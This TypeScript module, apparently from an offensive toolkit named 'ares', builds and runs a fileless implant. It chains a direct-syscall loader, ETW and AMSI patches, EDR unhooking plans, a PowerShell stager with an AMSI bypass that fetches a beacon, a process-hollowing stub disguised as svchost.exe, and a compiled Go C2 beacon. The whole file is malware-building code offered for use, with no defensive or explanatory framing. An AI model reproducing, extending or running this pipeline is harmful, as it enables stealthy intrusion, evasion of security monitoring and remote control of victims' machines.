/**
 * @module ares/fileless_implant
 * Memory-only implant — EvasionExecutor build+run, reflective loader, direct syscalls, ETW/AMSI.
 */
import { EvasionExecutor, buildPowerShellStager, renderBypassPayload } from "../evasion.ts"
import { EDREvasionEngine } from "../edr_evasion.ts"
import { NativeImplantGenerator } from "../implant_gen.ts"
import { generateProcessHollowingStub } from "../malware_dev.ts"
import { ensureAresDir, liveRequired, writeArtifact } from "./_base.ts"
import { c2Material, execEvasionPlans, step, type ExecStep } from "./_integrations.ts"

export interface FilelessImplantResult {
  artifacts: string[]
  techniques: string[]
  steps: ExecStep[]
  built: boolean
  executed: boolean
  summary: string
}

export async function buildFilelessImplant(opts: {
  live?: boolean
  payload?: string
  target?: string
}): Promise<FilelessImplantResult> {
  liveRequired("ares_fileless_implant", opts)
  const dir = ensureAresDir("fileless")
  const exec = new EvasionExecutor(dir)
  const edr = new EDREvasionEngine()
  const artifacts: string[] = []
  const techniques: string[] = []
  const steps: ExecStep[] = []
  let built = false
  let executed = false

  for (const name of ["syscall-loader-c", "etw-patch-c", "amsi-patch-c", "csharp-loader"] as const) {
    const builtArt = await exec.build(name)
    techniques.push(name)
    if (builtArt.artifact) artifacts.push(builtArt.artifact)
    if (builtArt.status === "built") built = true
    steps.push(step(`build_${name}`, builtArt.status === "built" || builtArt.status === "generated", builtArt.note ?? builtArt.status))

    const runResult = await exec.run(name, { live: true, target: opts.target ?? "127.0.0.1" })
    if (runResult.status === "executed") executed = true
    steps.push(step(`run_${name}`, runResult.status === "executed" || runResult.status === "remote-requires-transport", String(runResult.note ?? runResult.status)))
  }

  steps.push(...await execEvasionPlans(edr, "fileless"))
  writeArtifact("fileless", "unhook_plan.json", JSON.stringify(edr.unhookModules(), null, 2))
  techniques.push("module_unhooking", "direct_syscalls", "etw_patch", "amsi_patch")

  const psStager = buildPowerShellStager(opts.payload ?? "http://127.0.0.1:8080/beacon", "amsi-reflection")
  const ps = writeArtifact("fileless", "stager.ps1", psStager)
  artifacts.push(ps)
  steps.push(step("powershell_stager", true, renderBypassPayload("amsi-reflection").slice(0, 100)))

  const hollow = writeArtifact("fileless", "process_hollow.c", generateProcessHollowingStub("svchost.exe"))
  artifacts.push(hollow)

  const { mailboxUrl, keyHex, session } = c2Material()
  const gen = new NativeImplantGenerator()
  const goSrc = gen.generateGo(mailboxUrl, keyHex, session)
  const goBuild = await gen.buildGo(goSrc, dir, { goos: process.platform === "win32" ? "windows" : "linux" })
  if (goBuild.artifact) artifacts.push(goBuild.artifact)
  if (goBuild.status === "built") built = true
  steps.push(step("native_beacon", goBuild.status === "built", goBuild.note ?? goBuild.status, goBuild.artifact))

  return {
    artifacts,
    techniques,
    steps,
    built,
    executed,
    summary: built
      ? `Fileless implant: ${artifacts.length} artifacts, executed=${executed}`
      : `Fileless implant: ${techniques.length} techniques generated — install mingw/go for PE build`,
  }
}

export default { buildFilelessImplant }
